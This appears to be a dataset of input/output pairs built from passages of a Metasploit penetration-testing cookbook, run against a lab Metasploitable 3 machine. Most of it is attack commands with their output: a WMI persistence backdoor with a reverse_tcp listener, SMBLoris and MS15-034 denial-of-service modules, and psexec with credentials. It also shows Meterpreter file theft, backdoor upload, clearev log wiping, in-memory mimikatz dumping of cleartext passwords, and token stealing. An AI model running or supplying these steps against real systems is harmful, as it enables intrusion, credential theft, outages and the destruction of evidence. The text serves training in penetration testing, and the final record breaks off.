    "output": "Server-Side Exploitation Chapter 3\n[*] Migration completed successfully.\nmeterpreter > getuid\nServer username: VAGRANT-2008R2\\vagrant\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(wmi_persistence) > exploit\n...\n[*] Clean up Meterpreter RC file:\n/root/.msf4/logs/wmi_persistence/192.168.216.10_20171029.5446/192.1\n68.216.10_20171029.5446.rc\nmsf exploit(wmi_persistence) >\n12. Then, we will set up our listener, using the Generic Payload Handler module so\nthat the next time the user logs in to the machine, we will get a new session using\nour WMI backdoor:\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LPORT 4445\nLPORT => 4445\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > exploit -j\n[*] Exploit running as background job 1.\n...\nmsf exploit(handler) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\nBy logging off and logging in as the administrator user on the target machine, we were able\nto verify that the backdoor works as expected.\nDenial of Service\nA Denial of Service (DoS) attack denies legitimate users access to computer services (or\nresources), usually by overloading the service with requests or by exploiting vulnerabilities,\nresulting in a degradation of performance, and possibly crashing the service or even the\noperating system.\n[ 119 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nGetting ready\nSMBLoris is a remote and uncredentialed DoS attack against Microsoft Windows operating\nsystems, caused by a 20+ year old vulnerability in the Server Message Block (SMB)\nnetwork protocol implementation.\nHow to do it...\n1. Before using the SMBLoris NBSS Denial of Service auxiliary DoS module, we\nneed to use the ulimit command to set the maximum number of open file\ndescriptors to 65535, so we can handle simultaneous connections:\nroot@kali:~# ulimit -n 65535\nroot@kali:~# ulimit -n\n65535\nroot@kali:~#\n2. Now that we have set the maximum number of simultaneous connections\nto 65535, we can use the SMBLoris NBSS Denial of Service auxiliary DoS module\nto attack our target, by simply setting the IP address of the Metasploitable 3\nmachine and typing run to run the module:\nroot@kali:~# msfconsole -q\nmsf > use auxiliary/dos/smb/smb_loris\nmsf auxiliary(smb_loris) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf auxiliary(smb_loris) > run\n[*] 192.168.216.10:445 - Sending packet from Source Port: 1025\n[*] 192.168.216.10:445 - Sending packet from Source Port: 1026\n[*] 192.168.216.10:445 - Sending packet from Source Port: 1027\n...snip...\n[*] 192.168.216.10:445 - Sending packet from Source Port: 29867\n^C[-] 192.168.216.10:445 - Auxiliary interrupted by the console\nuser\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_loris) >\nWe can launch msfconsole with the -q option, so it does not print the\nbanner on startup. To display the manual page for MSFconsole, you can\nuse the man command like this—man msfconsole.\n[ 120 ]\nServer-Side Exploitation Chapter 3\n3. Looking at the target machine, we can see the attack consumes large chunks of\nmemory in the target by sending SMB requests with the NetBIOS Session\nService (NBSS) length header value set to the maximum possible value, which\ninitiates a large numbers of sessions, and the memory does not get freed, halting\nthe target machine:\nAnother awesome DoS attack is the MS15-034 HTTP Protocol Stack Request Handling\nDenial-of-Service.\n[ 121 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nHow to do it...\nIf Microsoft Windows 7, Windows 8, Windows Server 2008, or Windows Server 2012 is\nrunning an IIS service without the MS15-034, we can crash the target using this simple\nattack:\nmsf > use auxiliary/dos/http/ms15_034_ulonglongadd\nmsf auxiliary(ms15_034_ulonglongadd) > show options\nModule options (auxiliary/dos/http/ms15_034_ulonglongadd):\nName Current Setting Required Description\n---- --------------- -------- -----------\nProxies no A proxy chain of format\ntype:host:port[,type:host:port][...]\nRHOSTS yes The target address range or ...\nmsf auxiliary(ms15_034_ulonglongadd) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(ms15_034_ulonglongadd) > run\n>[*] Scanned 1 of 1 hosts (100% complete)\n...\nmsf auxiliary(ms15_034_ulonglongadd) >\nThe result should be the familiar Blue Screen of Death:\n[ 122 ]"
  },
  {
    "input": "Chapter 4: Meterpreter",
    "output": "4\nMeterpreter\nIn this chapter, we will cover the following recipes:\nUnderstanding the Meterpreter core commands\nUnderstanding the Meterpreter filesystem commands\nUnderstanding the Meterpreter networking commands\nUnderstanding the Meterpreter system commands\nSetting up multiple communication channels with the target\nMeterpreter anti-forensics\nThe getdesktop and keystroke sniffing\nUsing a scraper Meterpreter script\nScraping the system with winenum\nAutomation with AutoRunScript\nMeterpreter resource scripts\nMeterpreter timeout control\nMeterpreter sleep control\nMeterpreter transports\nInteracting with the registry\nLoad framework plugins\nMeterpreter API and mixins\nRailgun—converting Ruby into a weapon\nAdding DLL and function definitions to Railgun\nInjecting the VNC server remotely\nEnabling Remote Desktop"
  },
  {
    "input": "Introduction",
    "output": "Meterpreter Chapter 4\nIntroduction\nSo far, we have laid more emphasis on the exploitation phase in which we tried out various\ntechniques and exploits to compromise our target. In this chapter, we will focus on\nMeterpreter, the most advanced payload in Metasploit, and what we can do after we have\nexploited the target machine. Meterpreter provides us with many features that can ease our\ntask of exploring the target machine. We have already seen how to use Meterpreter in\nprevious chapters but in the following chapters, we will understand Meterpreter in detail,\nas well as how to use it as a potential tool for the post-exploitation phase.\nWe have been using payloads in order to achieve specific results, but they have a major\ndisadvantage. Payloads work by creating new processes in the compromised system. This\ncan trigger alarms in antivirus programs and can be caught easily. Also, a payload is limited\nto perform only some specific tasks or execute specific commands that the shell can run. To\novercome these difficulties, Meterpreter was created.\nMeterpreter is a command interpreter for Metasploit that acts as a payload and works by\nusing in-memory DLL injections and a native shared object format. It works in context with\nthe exploited process; hence, it does not create any new process. This makes it more stealthy\nand powerful.\nLet's take a look at some Meterpreter functions. The following diagram shows a simple\nstepwise representation of loading Meterpreter:\n[ 124 ]"
  },
  {
    "input": "Understanding the Meterpreter core commands",
    "output": "Meterpreter Chapter 4\nIn the first step, the exploit and first stage payload are sent to the target machine. After\nexploitation, the stage establishes a TCP connection back to msfconsole on a given address\nand port. Next, msfconsole sends the second stage DLL injection payload. After successful\ninjection, it sends the Meterpreter DLL to establish a proper communication channel. Lastly,\nMeterpreter loads extensions such as stdapi and priv. All these extensions are loaded\nover TLS using a TLV protocol. Meterpreter uses encrypted communication with the target,\nwhich is another major advantage of using it.\nLet's quickly summarize the advantages of Meterpreter over specific payloads:\nIt works in context with the exploited process, so it doesn't create a new process\nIt can migrate easily among processes\nIt resides completely in memory, so it writes nothing to disk\nIt uses encrypted communications\nIt uses a channelized communication system so that we can work with several\nchannels at a time\nIt provides a platform to write extensions quickly and easily\nThis chapter is dedicated entirely to exploring the target machine by using the various\ncommands and scripts that Meterpreter provides us with. We will start by analyzing\ncommon Meterpreter commands. Then, we will move ahead with setting up different\ncommunication channels, using networking commands, key sniffing, and so on. Finally, we\nwill discuss the scraper Meterpreter script, which can create a single directory containing\nvarious pieces of information about the target user. In this chapter, we will mainly focus on\nthe commands and scripts which can be helpful in exploring the compromised system.\nSo, let's move ahead and look at the recipes which enable us to dive deeper into\nMeterpreter.\nUnderstanding the Meterpreter core\ncommands\nLet's start by using Meterpreter commands to understand their functionality. As it is a post-\nexploitation tool, we will require a compromised target to execute the commands. We will\nbe using the Metasploitable 3 machine as a target that we have exploited using the\nMicrosoft Windows Authenticated User Code Execution exploit module.\n[ 125 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nGetting ready\nTo avoid setting up the Microsoft Windows Authenticated User Code Execution exploit\nmodule every single time we want to test Meterpreter commands, we will use one of my\nfavorite Metasploit Framework features, resource scripts. Resource scripts provide an easy\nway for us to automate repetitive tasks in Metasploit.\nHow to do it...\n1. The Metasploit Framework comes packed with several resource scripts that have\nbeen contributed to by the community, which you can find\nat /usr/share/metasploit-framework/scripts/resource/ in your Kali\nLinux machine:\nroot@kali:~# ls /usr/share/metasploit-framework/scripts/resource/\nauto_brute.rc fileformat_generator.rc\nauto_cred_checker.rc mssql_brute.rc\nauto_pass_the_hash.rc multi_post.rc\nauto_win32_multihandler.rc nessus_vulns_cleaner.rc\nautocrawler.rc oracle_login.rc\nautoexploit.rc oracle_sids.rc\nbap_all.rc oracle_tns.rc\nbap_dryrun_only.rc port_cleaner.rc\nbap_firefox_only.rc portscan.rc\nbap_flash_only.rc run_all_post.rc\nbap_ie_only.rc wmap_autotest.rc\nbasic_discovery.rc\n2. To create our own resource scripts, we simply need to execute the module and\nthen use the makerc command to create a resource file with the saved commands\nexecuted since startup to a file:\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(psexec) > set SMBUSER Administrator\nSMBUSER => Administrator\nmsf exploit(psexec) > set SMBPASS vagrant\nSMBPASS => vagrant\nmsf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(psexec) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\n[ 126 ]\nMeterpreter Chapter 4\nmsf exploit(psexec) > exploit\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] 192.168.216.10:445 - Connecting to the server...\n...\nmeterpreter >\nBackground session 1? [y/N]\nmsf exploit(psexec) > makerc /root/psexec.rc\n[*] Saving last 7 commands to /root/psexec.rc ...\nmsf exploit(psexec) >\n3. The resulting resource script contains the following:\nroot@kali:~# cat psexec.rc\nuse exploit/windows/smb/psexec\nset RHOST 192.168.216.10\nset SMBUSER Administrator\nset SMBPASS vagrant\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.216.5\nexploit\nroot@kali:~#\n4. To run a resource script when launching msfconsole, use the -r option\nfollowed by the path to the resource script:\nroot@kali:~# msfconsole -q -r psexec.rc\n...\n[*] 192.168.216.10:445 - Selecting PowerShell target\n[*] 192.168.216.10:445 - Executing the payload...\n[+] 192.168.216.10:445 - Service start timed out, OK if running a\ncommand or non-service executable...\n[*] Sending stage (179267 bytes) to 192.168.216.10\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.10:49292) at 2017-10-30 07:42:23 -0400\nmeterpreter >\n5. After compromising the target machine, we will have a Meterpreter session\nstarted, since we have used the windows/meterpreter/reverse_tcp payload.\nWe will start off by using a simple ? command, which will list all the available\nMeterpreter commands, along with a short description:\nmeterpreter > ?\n[ 127 ]\nMeterpreter Chapter 4\n6. Let's start with some useful system commands:\nbackground: This command is used to set the current session as the\nbackground so that it can be used again when needed. This command\nis useful when there are multiple active Meterpreter sessions.\ngetuid: This command returns the username that is running or the\none which we broke into, on the target machine:\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\ngetpid: This command returns the process ID in which we are\ncurrently running Meterpreter:\nmeterpreter > getpid\nCurrent pid: 666\nps: This command will list all the running processes on the target\nmachine. It can be helpful in identifying various services and\nsoftware running on the target:\nsysinfo: This is a handy command to quickly verify the system\ninformation, such as the operating system and architecture:\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\n[ 128 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\nshell: This command takes us to a shell prompt. We have already\nseen the use of this Meterpreter command in some of our previous\nrecipes:\nmeterpreter > shell\nProcess 5704 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights\nreserved.\nC:\\Windows\\system32>\nexit: This command is used to terminate a Meterpreter session. It\ncan also be used to terminate the shell session and return to\nMeterpreter.\nThese are a few useful system commands that can be used to explore the compromised\ntarget to gain more information about it. There are lots of other commands, which I am\nleaving for you to try and explore. You might have noticed how easy it is to use the\nMeterpreter commands and explore the target, which would have been a difficult task\nwithout it. In our next recipe, we will focus on some advanced Meterpreter commands.\nHow it works...\nMeterpreter works like any command interpreter. It is designed to understand and respond\nto various parameter calls through commands. It resides in the context of an\nexploited/compromised process and creates a client/server communication system with the\npenetration tester's machine, as shown in the following diagram:\n[ 129 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nThe preceding diagram demonstrates how Meterpreter functions in a nutshell. Once the\ncommunication channel is set up, we can send command calls to the Meterpreter server to\nget its response back to our machine. We will understand the communication between the\npen-testing machine and the compromised target in greater detail as we move ahead with\nthis chapter.\nUnderstanding the Meterpreter filesystem\ncommands\nIn this recipe, we will move on to filesystem commands. These commands can be helpful in\nexploring the target system to perform various tasks, such as searching for files,\ndownloading files, and changing the directory. You will notice how easy it is to control the\ntarget machine using Meterpreter. So, let's start working with some of the useful filesystem\ncommands.\nHow to do it...\n1. We will start with the simple pwd command, which lists our present working\ndirectory on the target machine. Similarly, we can use the cd command to change\nour working directory to our preferred location:\nmeterpreter > pwd\nC:\\Windows\\system32\nmeterpreter > cd \\\nmeterpreter > pwd\nC:\\\nAs you can see, we first listed our working directory using the pwd command and\nthen changed our working directory to C: by using the cd command. We can also\nuse the ls command to list the available files in the current directory.\n2. Now that we can work with directories, our next task will be to search for files on\nthe drive. It will be very tedious to browse every directory and subdirectory to\nlook for files. We can use the search command to quickly search for specific file\ntypes. Consider the following example:\nmeterpreter > search -f *.doc -d c:\\\nFound 3 results...\nc:\\ManageEngine\\DesktopCentral_Server\\licenses\\LICENSE_TRAYICON.doc\n[ 130 ]\nMeterpreter Chapter 4\n(24064 bytes)\nc:\\Program Files\\OpenSSH\\home\\Public\\Documents\\jack_of_hearts.docx\n(676796 bytes)\nc:\\Users\\Public\\Documents\\jack_of_hearts.docx (676796 bytes)\nThis command will search for all files in the C: drive which have .doc as the file\nextension. The –f parameter is used to specify the file pattern to search for, and\nthe –d parameter tells the directory which file is to be searched.\n3. So, once we have searched for our specific file, the next thing we can do is\ndownload the file locally on the target machine. First, let's try to download the\nfile to our attacking system:\nmeterpreter > download\nC:\\\\Users\\\\Public\\\\Documents\\\\jack_of_hearts.docx\n[*] Downloading: C:\\Users\\Public\\Documents\\jack_of_hearts.docx ->\njack_of_hearts.docx\n[*] Downloaded 660.93 KiB of 660.93 KiB (100.0%):\nC:\\Users\\Public\\Documents\\jack_of_hearts.docx ->\njack_of_hearts.docx\n[*] download : C:\\Users\\Public\\Documents\\jack_of_hearts.docx ->\njack_of_hearts.docx\nNote that you need to use double-slashes when you give the Windows path\nin the download command.\nBy using the download command, we can successfully download any file from\nthe target machine to our machine. The\nC:\\Users\\Public\\Documents\\jack_of_hearts.docx file gets downloaded in\nthe root folder of our attacking machine.\n4. Similarly, we can use the upload command to send any file to the target\nmachine:\nmeterpreter > upload backdoor.exe\n[*] uploading : backdoor.exe -> backdoor.exe\n[*] uploaded : backdoor.exe -> backdoor.exe\n5. To remove a file or a directory from the target machine, we can use the\nrm command:\nmeterpreter > rm backdoor.exe\n[ 131 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\n6. Editing files using Meterpreter can be done by using the edit command, which\nuses vim so all the editor's commands are available:\nmeterpreter > edit flag.txt\n7. One of my favorite commands is the show_mount command, which allows you to\nlist all mount points/logical drives in the target system:\nmeterpreter > show_mount\nMounts / Drives\n===============\nName Type Size (Total) Size (Free) Mapped to\n---- ---- ------------ ----------- ---------\nC:\\ fixed 60.00 GiB 42.31 GiB\nTotal mounts/drives: 1\n8. To display all the available commands, you can use the help command followed\nby the group of commands you want to display:\nmeterpreter > help File system Commands\nStdapi: File system Commands\n============================\nCommand Description\n------- -----------\ncat Read the contents of a file to the screen\ncd Change directory\nchecksum Retrieve the checksum of a file.\n...\nHow it works...\nMeterpreter gives us complete access to the target machine by setting up an interactive\ncommand prompt. We can also drop a shell session to work in the default Windows DOS\nmode, but it will not have as many functionalities. This was a quick reference to some of the\nimportant filesystem commands of Meterpreter, which can help us in exploring the files\npresent on the target machine. There are more commands as well; it is recommended that\nyou try them out and find the various possibilities which exist.\n[ 132 ]"
  },
  {
    "input": "Getting ready",
    "output": "Meterpreter Chapter 4\nIn the next recipe, we will look at a very interesting Meterpreter command called\ntimestomp, which can be used to modify the file attributes on the target machine.\nUnderstanding Meterpreter networking\ncommands\nMeterpreter provides us with some useful networking commands as well. These commands\ncan be useful in understanding the network structure of the target user. We can analyze\nwhether the system belongs to a LAN or if it is a standalone system. We can also find out\nthe IP range, DNS, and other information. Such network information can be useful when we\nhave to perform pivoting. Pivoting is a concept by which we can compromise other\nmachines on the same network in which our target is present. We will also understand\npivoting, where we will focus on the advanced use of Meterpreter.\nGetting ready\nBefore we get into the recipe, there are three networking terms that we will encounter here.\nSo, let's give our memory a quick brush over by looking at the following terms:\nSubnetwork or subnet is the concept of dividing a large network into smaller,\nidentifiable parts. Subnetting is done to increase the address utility and security.\nA netmask is a 32-bit mask that is used to divide an IP address into subnets and\nspecify the network's available hosts.\nThe gateway specifies the forwarding or the next hop IP address over which the\nset of addresses defined by the network destination and subnet mask are\nreachable.\nWe will be using these three terms when we deal with the route command and other\nnetwork commands.\n[ 133 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nHow to do it...\n1. There are several networking commands provided by Meterpreter, which we can\ndisplay using the help command followed by net for the network. Let's have a\nquick look at each of them:\nmeterpreter > help net\nStdapi: Networking Commands\n===========================\nCommand Description\n------- -----------\narp Display the host ARP cache\ngetproxy Display the current proxy configuration\nifconfig Display interfaces\nipconfig Display interfaces\nnetstat Display the network connections\nportfwd Forward a local port to a remote service\nresolve Resolve a set of host names on the target\nroute View and modify the routing table\n2. The arp command displays the host ARP cache:\nmeterpreter > arp\nARP cache\n=========\nIP address MAC address Interface\n---------- ----------- ---------\n10.0.0.2 00:50:56:e7:ac:5c 19\n10.0.0.129 00:0c:29:2d:94:ea 19\n10.0.0.254 00:50:56:fb:75:cc 19\n...\n3. The getproxy command allows us to see the current proxy configuration:\nmeterpreter > getproxy\nAuto-detect : Yes\nAuto config URL :\nProxy URL :\nProxy Bypass :\n[ 134 ]\nMeterpreter Chapter 4\n4. The ipconfig/ifconfig commands are used to display all the TCP/IP network\nconfigurations of the target machine. They list information such as the target IP\naddress, hardware MAC, and netmask:\nmeterpreter > ifconfig\nInterface 1\n============\nName : Software Loopback Interface 1\nHardware MAC : 00:00:00:00:00:00\nMTU : 4294967295\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n...\nInterface 19\n============\nName : Intel(R) PRO/1000 MT Network Connection #2\nHardware MAC : 00:0c:29:38:b3:b3\nMTU : 1500\nIPv4 Address : 10.0.0.132\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::2cf6:bd0e:492e:ddf6\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n...\nAs you can see, the output of ifconfig lists the various active TCP/IP\nconfigurations.\n5. The netstat command displays the network connections:\nmeterpreter > netstat\nConnection list\n===============\nProto Local address Remote address State User Inode\nPID/Program name\n----- ------------- -------------- ----- ---- ----- ------\n----------\ntcp 0.0.0.0:22 0.0.0.0:* LISTEN 0 0\n2948/sshd.exe\ntcp 0.0.0.0:135 0.0.0.0:* LISTEN 0 0\n640/svchost.exe\n[ 135 ]\nMeterpreter Chapter 4\ntcp 0.0.0.0:445 0.0.0.0:* LISTEN 0 0\n4/System\ntcp 0.0.0.0:1617 0.0.0.0:* LISTEN 0 0\n1904/java.exe\ntcp 0.0.0.0:3000 0.0.0.0:* LISTEN 0 0\n5352/ruby.exe\n...\n6. The portfwd command is used to forward incoming TCP and/or UDP\nconnections to remote hosts. Consider the following example to understand port\nforwarding:\nConsider host A, host B (in the middle), and host C. Host A should connect to host\nC in order to do something, but if for any reason it's not possible, host B can\ndirectly connect to C. If we use host B in the middle, to get the connection stream\nfrom A and pass it to B while taking care of the connection, we say host B is doing\nport forwarding. This is how things will appear on the wire—host B is running a\nsoftware that opens a TCP listener on one of its ports, say, port 20. Host C is also\nrunning a listener that is used to connect to host B when a packet arrives from\nport 20. So, if A sends any packet on port 20 of B, it will automatically be\nforwarded to host C. Hence, host B is port forwarding its packets to host C.\n7. The next networking command is the route command. It is similar to\nthe route command of MS-DOS. This command is used to display or modify the\nlocal IP routing table on the target machine. Executing the route command lists\nthe current table:\nmeterpreter > route\nIPv4 network routes\n===================\nSubnet Netmask Gateway Metric\nInterface\n------ ------- ------- ------ -----\n----\n0.0.0.0 0.0.0.0 192.168.216.2 266 13\n0.0.0.0 0.0.0.0 10.0.0.2 10 19\n10.0.0.0 255.255.255.0 10.0.0.132 266 19\n10.0.0.132 255.255.255.255 10.0.0.132 266 19\n10.0.0.255 255.255.255.255 10.0.0.132 266 19\n127.0.0.0 255.0.0.0 127.0.0.1 306 1\n...\n[ 136 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\n8. To display the help menu for a specific command, for example,\nthe route command, you can use the –h flag:\nmeterpreter > route -h\nUsage: route [-h] command [args]\nDisplay or modify the routing table on the remote machine.\nSupported commands:\nadd [subnet] [netmask] [gateway]\ndelete [subnet] [netmask] [gateway]\nlist\nHow it works...\nTo start port forwarding with a remote host, we can add a forwarding rule first. Consider\nthe following command line:\nmeterpreter> portfwd -a -L 127.0.0.1 -l 444 -h 69.54.34.38 -p 3389\nNotice the different command parameters. With the -a parameter, we can add a new port\nforwarding rule. The-L parameter defines the IP address to bind a forwarded socket to. As\nwe're running these parameters on host A, and want to continue our work from the same\nhost, we set the IP address to 127.0.0.1:\n-l: Is the port number which will be opened on host A for accepting incoming\nconnections\n-h: Defines the IP address of host C, or any other host within the internal\nnetwork\n-p: Is the port you want to connect to on host C\nThis was a simple demonstration of using port forwarding. This technique is actively used\nto bypass firewalls and intrusion detection systems.\n[ 137 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nUnderstanding the Meterpreter system\ncommands\nMeterpreter system commands allow you to access system-specific commands without\ndropping to a shell session.\nHow to do it...\n1. clearev clears the Application, System, and Security logs on the target\nsystem:\nmeterpreter > clearev\n[*] Wiping 525 records from Application...\n[*] Wiping 1916 records from System...\n[*] Wiping 1565 records from Security...\n2. The execute command executes a command on the target. The awesome thing\nabout the execute command is that it allows us to run commands from memory\nwithout uploading the binary to the target, this way effectively bypassing several\nantivirus products.\nIn the next example, I will show you how to run mimikatz directly in memory.\nThe command I will use is the following:\nexecute -H -i -c -m -d calc.exe -f\n/usr/share/mimikatz/x64/mimikatz.exe -a '\"sekurlsa::logonPasswords\nfull\" exit'\nFrom the preceding command:\n-H hides the process\n-i allows us to interact with the process after we create it\n-c channels the I/O\n-m instructs that we want to execute from memory\n-d is for the dummy executable we want to launch\ncalc.exe is the dummy executable\n-f is used for the path of the executable command to run\n[ 138 ]\nMeterpreter Chapter 4\n/usr/share/mimikatz/x64/mimikatz.exe is the path to the\nmimikatz binary in our Kali Linux machine\n-a is used for the arguments to pass to the command and\n'\"sekurlsa::logonPasswords full\" exit' are the\narguments for mimikatz\nThe following is a snippet of the output showing the administrator password in\nclear text:\nmeterpreter > execute -H -i -c -m -d calc.exe -f\n/usr/share/mimikatz/x64/mimikatz.exe -a '\"sekurlsa::logonPasswords\nfull\" exit'\nProcess 5920 created.\nChannel 3 created.\n.#####. mimikatz 2.1.1 (x64) built on Aug 1 2017 04:46:23\n.## ^ ##. \"A La Vie, A L'Amour\"\n## / \\ ## /* * *\n## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)\n'#####' with 21 modules * * */\nmimikatz(commandline) # sekurlsa::logonPasswords full\n...\n* Username : Administrator\n* Domain : VAGRANT-2008R2\n* LM : 5229b7f52540641daad3b435b51404ee\n* NTLM : e02bc503339d51f71d913c245d35b50b\n* SHA1 : c805f88436bcd9ff534ee86c59ed230437505ecf\ntspkg :\n* Username : Administrator\n* Domain : VAGRANT-2008R2\n* Password : vagrant\n...\nBefore running mimikatz, migrate to the LSASS.exe process using the migrate\n-N lsass.exe command.\n3. The getpid command displays the current process identifier:\nmeterpreter > getpid\nCurrent pid: 456\n[ 139 ]\nMeterpreter Chapter 4\n4. The getprivs command will attempt to enable all privileges available to the\ncurrent process:\nmeterpreter > getprivs\nEnabled Process Privileges\n==========================\nName\n----\nSeAssignPrimaryTokenPrivilege\nSeAuditPrivilege\nSeBackupPrivilege\nSeChangeNotifyPrivilege\nSeCreateGlobalPrivilege\n...\n5. The getsid command gets the SID of the user that the target is running as:\nmeterpreter > getsid\nServer SID: S-1-5-18\n6. The getuid command displays the user that the target is running as:\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n7. The kill command will terminate one or more processes using their PID:\nmeterpreter > kill 4372\nKilling: 4372\n8. The pgrep command filters processes by name:\nmeterpreter > pgrep calc.exe\n4372\n9. The pkill command terminates a process by name:\nmeterpreter > pkill notepad.exe\nFiltering on 'notepad.exe'\nKilling: 6000\n[ 140 ]\nMeterpreter Chapter 4\n10. The ps command lists all running processes:\nmeterpreter > ps -S backdoor.exe\nFiltering on 'backdoor.exe'\nProcess List\n============\nPID PPID Name Arch Session User Path\n--- ---- ---- ---- ------- ---- ----\n744 456 mspaint.exe x64 0 NT AUTHORITY\\SYSTEM C:\\backdoor.exe\n11. To display all the ps command options, we can use the -h flag:\nmeterpreter > ps -h\nUsage: ps [ options ] pattern\nUse the command with no arguments to see all running processes. The following\noptions can be used to filter those results:\n-A <opt>: Filter on architecture\n-S <opt>: Filter on process name\n-U <opt>: Filter on username\n-c: Filter only child processes of the current shell\n-h: Help menu\n-s: Filter only system processes\n-x: Filter for exact matches rather than regex\nreg: Used to modify and interact with the remote registry\nmeterpreter > reg enumkey -k HKLM\\\\Software\nEnumerating: HKLM\\Software\nKeys (17):\n7-Zip\nATI Technologies\nCBSTEST\n...\nPolicies\nRegisteredApplications\nWow6432Node\n[ 141 ]"
  },
  {
    "input": "Setting up multiple communication channels with the target",
    "output": "Meterpreter Chapter 4\n12. The shell command allows us to drop into a system command shell:\nmeterpreter > shell\nProcess 5796 created.\nChannel 4 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32>\n13. The steal_token command will attempt to steal an impersonation token from\nthe target process:\nmeterpreter > steal_token 4740\nStolen token with username: VAGRANT-2008R2\\Administrator\nmeterpreter > getuid\nServer username: VAGRANT-2008R2\\Administrator\n14. The rev2self command calls RevertToSelf() on the remote target:\nmeterpreter > rev2self\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n15. The suspend command will suspend or resume a list of processes:\nmeterpreter > suspend 500\n[*] Suspending: 500\n[*] Targeting process with PID 500...\nSetting up multiple communication channels\nwith the target\nIn this recipe, we will look at how we can set up multiple channels for communication with\nthe target. As we discussed in this chapter's introduction, the communication between the\nclient and server in Meterpreter is in encrypted form and uses the Type-Length-Value\n(TLV) protocol for data transfer. The major advantage of using TLV is that it allows tagging\nof data with specific channel numbers, thus allowing multiple programs running on the\nvictim to communicate with Meterpreter on the attacking machine. This facilitates setting\nup several communication channels at a time.\n[ 142 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nNow, let's analyze how to set up multiple communication channels with the target machine\nusing Meterpreter.\nGetting ready\nAs we saw in the previous recipe, Meterpreter provides us with a specific command named\nexecute, which can be used to start multiple communication channels. To start with, let's\nrun the execute –h command to see the available options:\nmeterpreter > execute -h\nUsage: execute -f file [options]\nThis executes a command on the remote machine. The following are the options:\n-H: Creates the process hidden from view\n-a <opt>: The arguments to pass to the command\n-c: Channelized I/O (required for interaction)\n-d <opt>: The dummy executable to launch when using -m\n-f <opt>: The executable command to run\n-h: Help menu\n-i: Interact with the process after creating it\n-k: Execute the process on the Meterpreter's current desktop\n-m: Execute from memory\n-s <opt>: Execute a process in a given session as the session user\n-t: Execute the process with the currently impersonated thread token\nYou can see the various parameters available to us with the execute command. Let's use\nsome of these parameters in setting up multiple channels.\nHow to do it...\n1. To start creating channels, we will use the –f operator with the execute\ncommand:\nmeterpreter > execute -f notepad.exe -c\nProcess 3128 created.\nChannel 1 created.\n[ 143 ]\nMeterpreter Chapter 4\nNotice the use of different parameters. The –f parameter is used for setting up an\nexecutable command, and the –c operator is used to set up a channelized I/O.\n2. Now, we can run the execute command again to start another channel without\nterminating the current channel:\nmeterpreter > execute -f cmd.exe -c\nProcess 3348 created.\nChannel 2 created.\nmeterpreter > execute -f mspaint.exe -c\nProcess 3359 created.\nChannel 3 created.\nWe now have three different channels running simultaneously on the victim\nmachine. To list the available channels, we can use the channel –l command. If we\nwant to send some data or write something on a channel, we can use the write\ncommand followed by the channel ID we want to write in.\n4. Let's go ahead and write a message in one of our active channels:\nmeterpreter > write 1\nEnter data followed by a \".\" on an empty line:\nMetasploit!\n.\n[*] Wrote 12 bytes to channel 1.\nExecuting the write command along with the channel ID prompted us to enter\nour data followed by a dot. We successfully wrote Metasploit! on the channel.\n5. In order to read the data of any channel, we can use the read command followed\nby the channel ID. Furthermore, if we want to interact with any channel, we can\nuse the channel command followed by -i and the channel ID:\nmeterpreter > channel -i 2\nInteracting with channel 2...\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\>^Z\nBackground channel 2? [y/N] y\nmeterpreter >\n[ 144 ]"
  },
  {
    "input": "Meterpreter anti-forensics",
